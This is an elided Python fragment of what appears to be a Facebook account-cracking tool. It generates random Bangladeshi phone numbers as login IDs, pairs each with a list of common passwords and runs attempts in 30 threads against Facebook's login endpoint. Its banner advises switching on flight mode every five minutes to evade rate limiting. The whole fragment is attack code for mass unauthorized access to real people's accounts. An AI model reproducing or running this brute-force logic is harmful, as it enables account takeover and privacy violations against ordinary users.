...
def rndm_bd():
        ...
        for Kid in range(limit):Mistah = ''.join(random.choice(string.digits) for _ in range(7));user.append(Mistah)
        with tred(max_workers=30) as Mistah:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : '016' '017' '018' '019') \n (+) Total Limit : {100000} \n (+) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:30],ids[:7],'102030','009988','908070','১২৩৪৫৬','১২৩৪৫৬৭৮','234567','405060','708090','665544','123412','00998877','778899','345678','908070','100200','135790','567890','first last','first@123','First Last','lastlast']
                        Mistah.submit(rndmx,ids,pasx,tl)
#-----------------------[ RNDM-CODE-INDIA ]-----------------------#
def rndm_ind():
...
def rndmx(ids,pasx,tl):
        ...
        try:
                for pas in pasx:
                        ...
                        url = 'https://x.facebook.com/auth/login'
